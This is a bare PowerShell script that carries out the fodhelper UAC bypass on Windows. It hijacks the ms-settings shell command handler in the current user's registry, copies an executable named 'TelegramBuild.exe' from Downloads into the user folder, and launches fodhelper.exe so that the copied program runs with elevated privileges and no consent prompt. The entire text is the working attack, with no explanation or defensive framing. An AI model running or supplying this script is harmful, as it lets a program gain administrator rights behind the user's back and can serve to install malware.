New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
Start-Sleep -Seconds 3
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Start-Sleep -Seconds 4
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "C:\Users\$env:USERNAME\not-existent-yet"
Copy-Item "C:\Users\$env:USERNAME\Downloads\TelegramBuild\TelegramBuild.exe" "C:\Users\$env:USERNAME\not-existent-yet"
Start-Sleep -Seconds 4
fodhelper.exe
